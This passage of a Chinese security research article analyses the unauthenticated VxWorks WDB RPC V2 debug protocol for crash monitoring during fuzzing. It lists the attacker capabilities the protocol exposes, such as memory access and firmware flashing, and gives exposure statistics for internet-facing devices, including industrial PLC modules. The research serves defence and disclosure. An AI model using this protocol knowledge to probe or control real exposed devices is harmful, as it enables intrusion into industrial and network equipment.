<p>对于VxWorks的Fuzzing，解决如上难点就需要一个VxWorks调试器，经研究得知，VxWorks的开发组件中的调试器工作时基于WDB RPC协议通过TServer与VxWorks 的TAgent模块通信，因此WDB RPC即是关键所在。</p>
<p>WDB RPC有V1和V2两个版本，VxWorks 5.5中使用V1版本，而VxWorks 6.6中使用V2版本，V2版本相较于V1版本有较多处修改，具体体现在协议字段及交互方式。</p>
<p>rapid7在<a href="https://community.rapid7.com/community/metasploit/blog/2010/08/02/shiny-old-vxworks-vulnerabilities">Shiny Old VxWorks Vulnerabilities</a>一文中指出了WDB Agent服务的安全隐患，并给出了相关探测和利用脚本:</p>
<ul>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/b206de77081069dd53b1f90f57bfaccd0ecbb0d8/modules/auxiliary/scanner/vxworks/wdbrpc_version.rb">metasploit-framework/modules/auxiliary/scanner/vxworks/wdbrpc_version.rb</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/b206de77081069dd53b1f90f57bfaccd0ecbb0d8/modules/auxiliary/scanner/vxworks/wdbrpc_bootline.rb">metasploit-framework/modules/auxiliary/scanner/vxworks/wdbrpc_bootline.rb</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/b206de77081069dd53b1f90f57bfaccd0ecbb0d8/modules/auxiliary/admin/vxworks/wdbrpc_reboot.rb">metasploit-framework/modules/auxiliary/admin/vxworks/wdbrpc_reboot.rb</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/b206de77081069dd53b1f90f57bfaccd0ecbb0d8/modules/auxiliary/admin/vxworks/wdbrpc_memory_dump.rb">metasploit-framework/modules/auxiliary/admin/vxworks/wdbrpc_memory_dump.rb</a></li>
</ul>
<p>这些脚本都是针对WDB RPC V1的，对V2版本的WDB RPC服务并不能有效的探测和利用。</p>
<p>因此本文不再讨论V1版本的协议，仅分析V2版本。</p>
<p>首先我们来了解什么是WDB RPC，WDB RPC是一个基于SUN-RPC协议的调试接口，它的服务运行在UDP协议的17185端口上，WDB RPC被包含在VxWoks TAgent模块中，利用WDB RPC调试接口不但可以直接访问系统内存，还可以监视VxWorks系统所有组件工作状态，当组件发生异常时TAgent通过TServer主动通知当前连接的Debugger，如下图(参考自Wind River Documentation)</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/5.jpg"><img class="aligncenter size-full wp-image-13133" src="http://www.aqniu.com/wp-content/uploads/2016/01/5.jpg" alt="5" width="487" height="406" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/5.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/5-300x250.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>如果我们安置一个监视器(VxMon)充当TServer的身份，摸拟Debugger与VxWorks OS 的TAgent模块通信，那么当VxWorks OS组件发生异常时，VxMon可以从TAgent获得异常通知，继而利用WDB RPC 接口再获取异常相关信息，从而解决以上技术难点。</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/6.jpg"><img class="aligncenter size-full wp-image-13134" src="http://www.aqniu.com/wp-content/uploads/2016/01/6.jpg" alt="6" width="487" height="385" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/6.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/6-300x237.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>(参考自Wind River Documentation)</p>
<ol>
<li><strong>WDB RPC V2 </strong><strong>协议分析</strong></li>
</ol>
<p>（1）请求数据包</p>
<p>WDB协议基于SUN-RPC，WDB RPC请求包如下图构造(引用自Wind River Documentation)：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/7.jpg"><img class="aligncenter size-full wp-image-13135" src="http://www.aqniu.com/wp-content/uploads/2016/01/7.jpg" alt="7" width="487" height="357" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/7.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/7-300x220.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>从上图我们可以得知，标准的WDB RPC请求包含如下信息：</p>
<ul>
<li>IP Header</li>
<li>UDP Header</li>
<li>RPC Request Header</li>
<li>WDB Parameter Wrapper</li>
<li>Function input parameters</li>
</ul>
<p>在WDB RPC 请求包中，WDB Parameter与Function input parametes两个字段 为重点内容，WDB Parameter Wrapper内容包含整个请求包的大小，校验和及请求系列号，Function input parameters 为请求功能号的携带辅助信息。</p>
<p>（2）响应数据包</p>
<p>WDB RPC应答包，如下图构造(引用自Wind River Documentation)：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/8.jpg"><img class="aligncenter size-full wp-image-13136" src="http://www.aqniu.com/wp-content/uploads/2016/01/8.jpg" alt="8" width="487" height="343" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/8.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/8-300x211.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>从上图我们可以得知，标准的WDB RPC应答包中含如下信息：</p>
<ul>
<li>IP Header</li>
<li>UDP Header</li>
<li>RPC Reply Header</li>
<li>WDB Reply Wrapper</li>
<li>Function output</li>
</ul>
<p>在WDB RPC 应答包中，WDB Reply Wrapper与Function output两个字段 为重点内容，WDB Parameter Wrapper内容包含整个请求包的大小、校验和及应答系列号（在每个请求与应答中，应答与请求系列号一致），Function output包含应答的输出信息，为请求功能号的返回信息。</p>
<ol start="2">
<li><strong>实现 VxMon 与 VxWorks OS &#8211; TAgent模块 通信</strong></li>
</ol>
<p><strong>V2</strong><strong>版本的WDB RPC与V1版本最大的区别在于，在发送各类请求（如获取VxWorks版本BSP信息等的请求WDB_TGT_INFO_GET）时，V1只用发送对应的请求包即可。而V2维护了一种类似Session的机制，在发送各类请求前，需要发送一个连接请求包（WDB_TARGET_CONNECT）以成功连接至TAgent，对于每个Session中的多个请求包（包括连接请求包），它们的SUN RPC -&gt; Transaction ID字段及WDB RPC -&gt; sequence字段的值需是连续递增的，否则就会收到包含错误的响应包。</strong></p>
<ul>
<li>WDB_TARGET_CONNECT</li>
</ul>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/9.jpg"><img class="aligncenter size-full wp-image-13137" src="http://www.aqniu.com/wp-content/uploads/2016/01/9.jpg" alt="9" width="323" height="229" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/9.jpg 323w, http://www.aqniu.com/wp-content/uploads/2016/01/9-300x213.jpg 300w" sizes="(max-width: 323px) 100vw, 323px" /></a></p>
<p>VxMon发送请求调用过程：VxMon请求连接至目标，功能号为WDB_TARGET_CONNECT</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/10.jpg"><img class="aligncenter size-full wp-image-13138" src="http://www.aqniu.com/wp-content/uploads/2016/01/10.jpg" alt="10" width="467" height="91" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/10.jpg 467w, http://www.aqniu.com/wp-content/uploads/2016/01/10-300x58.jpg 300w" sizes="(max-width: 467px) 100vw, 467px" /></a></p>
<p>&nbsp;</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/111.jpg"><img class="aligncenter size-full wp-image-13139" src="http://www.aqniu.com/wp-content/uploads/2016/01/111.jpg" alt="11" width="368" height="264" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/111.jpg 368w, http://www.aqniu.com/wp-content/uploads/2016/01/111-300x215.jpg 300w" sizes="(max-width: 368px) 100vw, 368px" /></a></p>
<p>TAgent应答过程：目标连接至VxMon(包含TAgent基本信息)</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/12.jpg"><img class="aligncenter size-full wp-image-13140" src="http://www.aqniu.com/wp-content/uploads/2016/01/12.jpg" alt="12" width="447" height="84" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/12.jpg 447w, http://www.aqniu.com/wp-content/uploads/2016/01/12-300x56.jpg 300w" sizes="(max-width: 447px) 100vw, 447px" /></a> <a href="http://www.aqniu.com/wp-content/uploads/2016/01/13.jpg"><img class="aligncenter size-full wp-image-13141" src="http://www.aqniu.com/wp-content/uploads/2016/01/13.jpg" alt="13" width="383" height="240" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/13.jpg 383w, http://www.aqniu.com/wp-content/uploads/2016/01/13-300x188.jpg 300w" sizes="(max-width: 383px) 100vw, 383px" /></a></p>
<ul>
<li>WDB_TGT_INFO_GET</li>
</ul>
<p>VxMon发送请求调用过程：VxMon请求获取目标信息，功能号为WDB_TGT_INFO_GET</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/14.jpg"><img class="aligncenter size-full wp-image-13142" src="http://www.aqniu.com/wp-content/uploads/2016/01/14.jpg" alt="14" width="445" height="80" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/14.jpg 445w, http://www.aqniu.com/wp-content/uploads/2016/01/14-300x54.jpg 300w" sizes="(max-width: 445px) 100vw, 445px" /></a> <a href="http://www.aqniu.com/wp-content/uploads/2016/01/15.jpg"><img class="aligncenter size-full wp-image-13143" src="http://www.aqniu.com/wp-content/uploads/2016/01/15.jpg" alt="15" width="440" height="273" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/15.jpg 440w, http://www.aqniu.com/wp-content/uploads/2016/01/15-300x186.jpg 300w" sizes="(max-width: 440px) 100vw, 440px" /></a></p>
<p>TAgent应答过程：在应答包中会含有Vxworks目标机很多信息。如系统版本，大小端，内存分配等等。</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/16.jpg"><img class="aligncenter size-full wp-image-13144" src="http://www.aqniu.com/wp-content/uploads/2016/01/16.jpg" alt="16" width="467" height="262" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/16.jpg 467w, http://www.aqniu.com/wp-content/uploads/2016/01/16-300x168.jpg 300w" sizes="(max-width: 467px) 100vw, 467px" /></a></p>
<ul>
<li>崩溃检测机制</li>
</ul>
<p>前提是我们有意构造对VxWorks组件攻击程序，当攻击进行后，VxWorks其中一个组件会被攻击发生崩溃。当VxWorks OS 组件发生崩溃时，TAgent会主动的通知VxMon发生异常事件。</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/17.jpg"><img class="aligncenter size-full wp-image-13145" src="http://www.aqniu.com/wp-content/uploads/2016/01/17.jpg" alt="17" width="258" height="177" /></a></p>
<p>当VxMon接收到EVENT NOTICATION消息时，应当立即回复包WDB_EVENT_GET包确认，否则VxWorks 会一直循环通知该消息。通过WDB_EVENT_GET消息，可以获取异常原因，异常组件任务ID及异常地址等信息，详细分析见下。</p>
<p>TAgent异常信息通知过程：当VxWorks组件崩溃时，TAgent发送如下字节码通知VxMon：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/18.jpg"><img class="aligncenter size-full wp-image-13146" src="http://www.aqniu.com/wp-content/uploads/2016/01/18.jpg" alt="18" width="461" height="163" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/18.jpg 461w, http://www.aqniu.com/wp-content/uploads/2016/01/18-300x106.jpg 300w" sizes="(max-width: 461px) 100vw, 461px" /></a></p>
<p>VxMon确认过程：VxMon发送WDB_EVENT_GET请求包进行确认：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/19.jpg"><img class="aligncenter size-full wp-image-13147" src="http://www.aqniu.com/wp-content/uploads/2016/01/19.jpg" alt="19" width="446" height="147" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/19.jpg 446w, http://www.aqniu.com/wp-content/uploads/2016/01/19-300x99.jpg 300w" sizes="(max-width: 446px) 100vw, 446px" /></a> <a href="http://www.aqniu.com/wp-content/uploads/2016/01/20.jpg"><img class="aligncenter size-full wp-image-13148" src="http://www.aqniu.com/wp-content/uploads/2016/01/20.jpg" alt="20" width="383" height="179" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/20.jpg 383w, http://www.aqniu.com/wp-content/uploads/2016/01/20-300x140.jpg 300w" sizes="(max-width: 383px) 100vw, 383px" /></a></p>
<p>TAgent应答过程：当TAgent接收到WDB_EVENT_GET请求时，将异常队列表中的异常信息发送给VxMon。</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/211.jpg"><img class="aligncenter size-full wp-image-13149" src="http://www.aqniu.com/wp-content/uploads/2016/01/211.jpg" alt="21" width="455" height="152" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/211.jpg 455w, http://www.aqniu.com/wp-content/uploads/2016/01/211-300x100.jpg 300w" sizes="(max-width: 455px) 100vw, 455px" /></a> <a href="http://www.aqniu.com/wp-content/uploads/2016/01/221.jpg"><img class="aligncenter size-full wp-image-13150" src="http://www.aqniu.com/wp-content/uploads/2016/01/221.jpg" alt="22" width="405" height="230" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/221.jpg 405w, http://www.aqniu.com/wp-content/uploads/2016/01/221-300x170.jpg 300w" sizes="(max-width: 405px) 100vw, 405px" /></a></p>
<p>从WDB_EVENT_GET应答包（上图）中我们可以得知Task Conext为0x79622C任务已崩溃， 同时我们从VxWorks系统提示也得到了验证（task 0x79622c has had a failure and has been stopped），如下：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/23.jpg"><img class="aligncenter size-full wp-image-13151" src="http://www.aqniu.com/wp-content/uploads/2016/01/23.jpg" alt="23" width="487" height="322" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/23.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/23-300x198.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>接下来主机请求更多的信息，如崩溃时寄存器内容，内存区域，异常代码。</p>
<p>通过VxMon发送WDB_REGS_GET请求，可以获取异常寄处器内容。</p>
<p>通过VxMon发送WDB_MEM_READ请求，可以获取异常地址的执行代码。如下：</p>
<p><a href="http://www.aqniu.com/wp-content/uploads/2016/01/24.jpg"><img class="aligncenter size-full wp-image-13152" src="http://www.aqniu.com/wp-content/uploads/2016/01/24.jpg" alt="24" width="487" height="305" srcset="http://www.aqniu.com/wp-content/uploads/2016/01/24.jpg 487w, http://www.aqniu.com/wp-content/uploads/2016/01/24-300x188.jpg 300w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<ol start="3">
<li><strong>代码</strong></li>
</ol>
<p>我们用Python封装了如上所述的功能，代码请移步至<a href="https://github.com/knownsec/VxPwn/blob/master/sulley/wdbdbg.py">wdbdbg.py</a>，其中需要用到第三方模块<a href="https://capstone-engine.github.io/download/3.0.4/capstone-3.0.4-python2.7-win32.exe">capstone</a>，请自行安装。</p>
<p><strong>五、暴露在互联网中的VxWorks WDB RPC V2服务!!!</strong></p>
<p>WDB RPC的功能如此完备，就成了一把双刃剑。由于它本身没有身份认证的功能，因此能够与VxWorks主机17185端口通信就可以调用它。如果使用它的是黑客而非开发调试人员，就可能造成极大危害：</p>
<ul>
<li>监视所有组件（服务）状态</li>
<li>恶意固件刷入、后门植入</li>
<li>重启VxWorks设备</li>
<li>任意内存读写</li>
<li>登陆绕过</li>
<li>&#8230;</li>
</ul>
<p>&nbsp;</p>
<p>Kimon在其 <a href="http://chuansong.me/n/1864339">揭秘VxWorks——直击物联网安全罩门</a> 一文中详尽地介绍了各种利用WDB RPC的攻击方式，因此本文不再一一列举。文中Kimon还给出了z-0ne的关于WDB RPC的全球统计:</p>
<p>通过Zmap调用wdbrpc-scan脚本扫描全网暴漏端口IP数约5万+，其中3.4万能读取到系统信息和bootline信息。</p>
<p>数量按国家分布Top10：</p>
<p>中国:       7861</p>
<p>美国:       5283</p>
<p>巴西:       3056</p>
<p>意大利:     1025</p>
<p>日本:       823</p>
<p>俄罗斯:      647</p>
<p>墨西哥:      505</p>
<p>哈萨克斯坦:  486</p>
<p>澳大利亚:    481</p>
<p>印度:       448</p>
<p>数量按VxWorks系统版本号统计：</p>
<p>VxWorks5.5.1  15601</p>
<p>VxWorks5.4.2  6583</p>
<p>VxWorks5.4    5410</p>
<p>VxWorks5.4.2  5254</p>
<p>VxWorks5.5    899</p>
<p>VxWorks       654</p>
<p>VxWorks5.3.1  236</p>
<p>数量按设备信息统计Top10：</p>
<p>Telogy Networks GG30E Reference Board 3674</p>
<p>TI TNETV1050 Communication Processor  3360</p>
<p>Motorola MPC82xx ADS &#8211; HIP7           2626</p>
<p>IP-ADSL DSLAM (MPC860/855T)           1972</p>
<p>HUAWEI ET&amp;IAD                         1796</p>
<p>MPC8245Board: EDSL , Map B (CHRP)     1678</p>
<p>PowerPC 875,  133MHZ                  1553</p>
<p>Mips 4KEc                             1239</p>
<p>MGCB                                   912</p>
<p>Intel IXP425 &#8211; IXDP425 BE              887</p>
<p>其中受影响的PLC模块型号：</p>
<p>罗克韦尔Rockwell Automation 1756-ENBT固件版本为3.2.6、3.6.1及其他</p>
<p>西门子Siemens CP 1604、Siemens CP 1616</p>
<p>施耐德Schneider Electric 昆腾部分以太网模块</p>
<p>&nbsp;</p>
<p>z-0ne的统计非常详尽，但从版本分布可以观察到，他探测及统计的是WDB RPC V1版本。</p>
<p>ZoomEye团队也对暴露在互联网中的WDB RPC服务进行了探测，全球IPv4网络空间中共有52586个主机运行着WDB RPC服务，其中：</p>
<ul>
<li>运行V1版本WDB RPC服务(即运行VxWorks 5.x版本的主机)的IP共30339个，数量较z-0ne在2015年11月1日统计得出的4万有所减少。</li>
<li>运行V2版本WDB RPC服务(即运行VxWorks 6.x版本的主机)的IP共2155个。</li>
<li>运行未知版本VxWorks的主机20093个。这些主机对V1和V2版本的WDB_TGT_INFO_GET请求，都没有返回我们期望的WDB_TGT_INFO格式的结果，而是返回了长度较短的错误响应数据包，但其格式符合WDB RPC的响应格式，因此基本可以说明这类主机运行着WDB RPC服务，即运行着VxWorks系统，但版本未知。该问题值得进一步研究。</li>
</ul>
<p>关于V1版本服务的结果统计，我们得到的结果与z-0ne相近，本文不再赘述，这里主要给出运行V2版本WDB RPC服务的共2155个主机的统计：</p>
<ol>
<li>国家分布统计TOP 10:</li>
</ol>
<table>
<tbody>
<tr>
<td width="189"><strong>国家</strong></td>
<td width="189"><strong>代号</strong></td>
<td width="189"><strong>数量</strong></td>
</tr>
<tr>
<td width="189">印度</td>
<td width="189">IN</td>
<td width="189">667</td>
</tr>
<tr>
<td width="189">乌干达</td>
<td width="189">UG</td>
<td width="189">266</td>
</tr>
<tr>
<td width="189">美国</td>
<td width="189">US</td>
<td width="189">228</td>
</tr>
<tr>
<td width="189">巴西</td>
<td width="189">BR</td>
<td width="189">156</td>
</tr>
<tr>
<td width="189">不丹</td>
<td width="189">BT</td>
<td width="189">128</td>
</tr>
<tr>
<td width="189">加拿大</td>
<td width="189">CA</td>
<td width="189">73</td>
</tr>
<tr>
<td width="189">纳米比亚</td>
<td width="189">NA</td>
<td width="189">60</td>
</tr>
<tr>
<td width="189">卢旺达</td>
<td width="189">RW</td>
<td width="189">60</td>
</tr>
<tr>
<td width="189">南非</td>
<td width="189">ZA</td>
<td width="189">59</td>
</tr>
<tr>
<td width="189">韩国</td>
<td width="189">KR</td>
<td width="189">57</td>
</tr>
</tbody>
</table>
<p>需要指出的是，其中位于中国的有7个。</p>
<p>&nbsp;</p>
<ol start="2">
<li>VxWorks 6.x版本统计</li>
</ol>
<table>
<tbody>
<tr>
<td width="284"><strong>版本</strong></td>
<td width="284"><strong>数量</strong></td>
</tr>
<tr>
<td width="284">VxWorks 6.6</td>
<td width="284">1878</td>
</tr>
<tr>
<td width="284">VxWorks 6.7</td>
<td width="284">8</td>
</tr>
<tr>
<td width="284">VxWorks 6.8</td>
<td width="284">250</td>
</tr>
<tr>
<td width="284">VxWorks 6.9</td>
<td width="284">4</td>
</tr>
<tr>
<td width="284">VxWorks 未知版本</td>
<td width="284">15</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<ol start="3">
<li>芯片/电路板 统计</li>
</ol>
<table>
<tbody>
<tr>
<td width="189"><strong>芯片</strong><strong>/</strong><strong>集成电路板</strong></td>
<td width="64"><strong>数量</strong></td>
<td width="315"><strong>应用产品或行业</strong></td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/products/microcontrollers-and-processors/power-architecture-processors/powerquicc-processors/powerquicc-ii-pro-83xx/low-power-powerquicc-ii-pro-processor-with-ddr2-esdhc-pci-express-etsec-usb-ieee-1588:MPC8308?lang_cd=zh-Hans">Freescale MPC8308</a></td>
<td width="64">671</td>
<td width="315">智能电网家庭能源网关、数据集线器、无线LAN接入点、无线家庭基站、消费电子印刷以及包括工业控制和工厂自动化在内的工业应用</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/products/software-and-tools/hardware-development-tools/embedded-board-solutions-ebs/low-power-powerquicc-ii-pro-processor-with-ddr2-pci-1-gb-ethernet-security-usb:MPC8313E?lang_cd=zh-Hans">Freescale MPC8313E</a></td>
<td width="64">522</td>
<td width="315">小型办公室/家庭办公室（SOHO）、打印、 IP服务和工业控制</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/products/microcontrollers-and-processors/power-architecture-processors/powerquicc-processors/powerquicc-iii-85xx/powerquicc-iii-processor-with-ddr2-pci-pci-express-serdes-1-gb-ethernet-sgmii-security:MPC8544E?lang_cd=zh-Hans">Freescale MPC8544</a></td>
<td width="64">291</td>
<td width="315">网络、通信及工业控制</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/zh-Hans/products/microcontrollers-and-processors/power-architecture-processors/qoriq-power-architecture-processors/qoriq-p1010-and-p1014-low-power-communications-processors-with-trust-architecture:P1010?uc=true&amp;lang_cd=zh-Hans">Freescale P1010E &#8211; Security Engine</a></td>
<td width="64">271</td>
<td width="315">IP摄像头、工业机器人、无线 LAN (WLAN)接入点、网络附加存储、打印及成像、路由器</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/zh-Hans/products/microcontrollers-and-processors/%E5%85%B6%E4%BB%96%E5%A4%84%E7%90%86%E5%99%A8/coldfire-plus-coldfire-mcu%E5%8F%8A%E5%A4%84%E7%90%86%E5%99%A8/coldfire-mpu/v3-mpu/coldfire-v3-microprocessor-with-ethernet-usb-and-encryption:MCF537X?lang_cd=zh-Hans">Freescale MCF5372L</a></td>
<td width="64">205</td>
<td width="315">互联网话音协议(VoIP)、安全与门禁控制面板、医疗保健仪器与设备</td>
</tr>
<tr>
<td width="189">Freescale Unknown processor</td>
<td width="64">88</td>
<td width="315">&nbsp;</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/products/microcontrollers-and-processors/power-architecture-processors/powerquicc-processors/powerquicc-iii-85xx/powerquicc-iii-processor-with-ddr2-pci-pci-express-serial-rapidio-serdes-1-gb-ethernet-security:MPC8548E?lang_cd=zh-Hans">Freescale CDS MPC8548E &#8211; Security Engine</a></td>
<td width="64">16</td>
<td width="315">企业网络、电信传输和交换，以及3G无线基站等仅以太网或RapidIO网络应用</td>
</tr>
<tr>
<td width="189"><a href="http://blog.chinaunix.net/uid-8196371-id-3214780.html">Freescale E500 : Unknown system version</a></td>
<td width="64">15</td>
<td width="315">通信、工业控制</td>
</tr>
<tr>
<td width="189"><a href="http://docplayer.net/4739974-Ip-phone-solutions-tnetv1050-1055.html">TI TNETV1050 Communication Processor</a></td>
<td width="64">14</td>
<td width="315">VoIP</td>
</tr>
<tr>
<td width="189">未知</td>
<td width="64">14</td>
<td width="315">&nbsp;</td>
</tr>
<tr>
<td width="189">BCM53000 (MIPS74K)</td>
<td width="64">12</td>
<td width="315">路由器</td>
</tr>
<tr>
<td width="189"><a href="https://www.linux-mips.org/wiki/Atheros_SOC">AR7100 SERIES</a></td>
<td width="64">8</td>
<td width="315">家用或企业级无线接入点、路由器、网关</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/zh-Hans/products/microcontrollers-and-processors/power-architecture-processors/qoriq-power-architecture-processors/qoriq-p2020-and-p2010-dual-and-single-core-communications-processors:P2020?">Freescale P2020E &#8211; Security Engine</a></td>
<td width="64">6</td>
<td width="315">联网、电信、军事、工业</td>
</tr>
<tr>
<td width="189"><a href="http://blog.csdn.net/qingfengtsing/article/details/23270481">Freescale E300C3</a></td>
<td width="64">6</td>
<td width="315">网络、通信、工业控制</td>
</tr>
<tr>
<td width="189">Intel(R) Pentium4 Processor SYMMETRIC IO MPTABLE</td>
<td width="64">2</td>
<td width="315">&nbsp;</td>
</tr>
<tr>
<td width="189"><a href="https://en.wikipedia.org/wiki/PowerPC_400#PowerPC_405">IBM PowerPC [Fluke Odin] 405GPr Rev. 1.1</a></td>
<td width="64">2</td>
<td width="315">数码相机、调制解调器、机顶盒、手机、GPS、打印机、传真机、网卡、交换机、存储设备</td>
</tr>
<tr>
<td width="189"><a href="http://cn.renesas.com/products/mpumcu/superh/sh7750/sh7751r/">RENESAS SH7751R 240MHz (BE)</a></td>
<td width="64">2</td>
<td width="315">路由器、PBX、LAN/WAN、打印机、扫描仪、PPC</td>
</tr>
<tr>
<td width="189"><a href="https://www.broadcom.com/products/enterprise-and-network-processors/processors/bcm91250a">Broadcom BCM91250A/swarm</a></td>
<td width="64">2</td>
<td width="315">Ethernet通信与交换</td>
</tr>
<tr>
<td width="189"><a href="http://china.xilinx.com/products/silicon-devices/soc/zynq-700s0.html">Xilinx Zynq-7000 ARMv7</a></td>
<td width="64">2</td>
<td width="315">高级驾驶员辅助系统、医疗内窥镜、小型蜂窝基带、专业照相机、机器视觉、电信级以太网回传、4K2K超高解析度电视、多功能打印机</td>
</tr>
<tr>
<td width="189"><a href="https://www.broadcom.com/products/enterprise-and-network-processors/voice-over-ip-(voip)/bcm1190">BCM1190 A2</a></td>
<td width="64">2</td>
<td width="315">VoIP、宽带接入</td>
</tr>
<tr>
<td width="189"><a href="http://www.nxp.com/zh-Hans/products/microcontrollers-and-processors/%E5%85%B6%E4%BB%96%E5%A4%84%E7%90%86%E5%99%A8/coldfire-plus-coldfire-mcu%E5%8F%8A%E5%A4%84%E7%90%86%E5%99%A8/coldfire-mpu/v4-mpu/mcf5485-evaluation-board:M5485EVB?lang_cd=zh-Hans">Telvent HU_A ColdFire Board (MCF5485)</a></td>
<td width="64">1</td>
<td width="315">工业和嵌入式联网</td>
</tr>
<tr>
<td width="189"><a href="http://rdlcom.com/products">RDL3000-SS &#8211; ARM11MPCore (ARM)</a></td>
<td width="64">1</td>
<td width="315">运载、SCADA、通信</td>
</tr>
<tr>
<td width="189"><a href="http://pdf.dzsc.com/88889/44463.pdf">ZTE SCCE(S3C2510 Rev.10.0)</a></td>
<td width="64">1</td>
<td width="315">SOHO路由器、网关、WLAN AP</td>
</tr>
<tr>
<td width="189"><a href="https://wikidevi.com/wiki/Atheros#AR5400.2FAR9100_series">AR9100 SERIES</a></td>
<td width="64">1</td>
<td width="315">家用或企业级无线接入点、路由器、网关</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>可以看到使用VxWorks 6.x的芯片或集成开发板与5.x版本的统计结果差别很大，由于VxWorks 6.x版本相较于5.x版本更为稳定，因此更多地运用于对稳定性、可信及实时控制要求更高的系统中，从上表中芯片或集成电路板的特性就可以看出这一点。</p>
<p>利用WDB RPC V2，可以尝试进一步确定使用这些芯片或集成开发板的设备的品牌或型号，并对这些设备进行进一步控制，玩法与Kimon介绍的WDB RPC V1版本类似，有兴趣的同学可以继续深入。</p>
<p><strong>六、总结</strong></p>
<p>本文介绍了如何基于Fuzzing框架Sulley实现基于对VxWorks 5.5和6.6系统的FTP服务和Sun-RPC rpcbind服务的自动化Fuzzing，并介绍了在实现VxWorks 6.6自动化Fuzzing过程中必不可少的WDB RPC V2协议，最后对暴露在互联网中的WDB RPC V2协议进行了探测，并给出了相关统计。</p>
<p>我们可以看到，将WDB RPC服务暴露于互联网中的危险性极大，但它是使用VxWorks系统的硬件设备的系统开发人员不可或缺的工具，在开发过程中需要开启它，但在编译出厂设备的VxWorks系统时一定要将其关闭。</p>
<p>作者：404@KnownSec</p>
<p>&nbsp;</p>
</p>
				</div>
				<div class="single-topic">
					<span>关键词:</span>
					<ul class="tags">
            					</ul>
				</div>
				<div class="clearfix"></div>
				<div class="margin-bottom-10"></div>
				<div class="clearfix"></div>
				<div class="single-share">
					<span>分享:</span>
					<div class="bdsharebuttonbox">
						<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
						<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
						<a href="#" class="bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
						<a href="#" class="bds_mail" data-cmd="mail" title="分享到邮件分享"></a>
						<a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a>
					</div>
					<script type="text/javascript">
						window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
					</script>
				</div>
				<div class="margin-bottom-30"></div>
				<hr class="l4">
      	      					<div class="row">
										<div class="col-md-6">
						<div class="blog-prev">
							<i class="fa fa-angle-left"></i>
							<span class="text-uppercase">上一篇</span>
							<p><a href="http://www.aqniu.com/threat-alert/13124.html">施耐德电气重要信息安全通知——M340以太网模块Web服务漏洞</a></p>
						</div>
					</div>
													<div class="col-md-6">
						<div class="blog-next text-right">
							<i class="fa fa-angle-right"></i>
							<span class="text-uppercase">下一篇</span>
							<p><a href="http://www.aqniu.com/threat-alert/13155.html">美国国家情报总监手机和个人电邮被黑</a></p>
						</div>
					</div>
									</div>
				<div class="post-author margin-bottom-90">
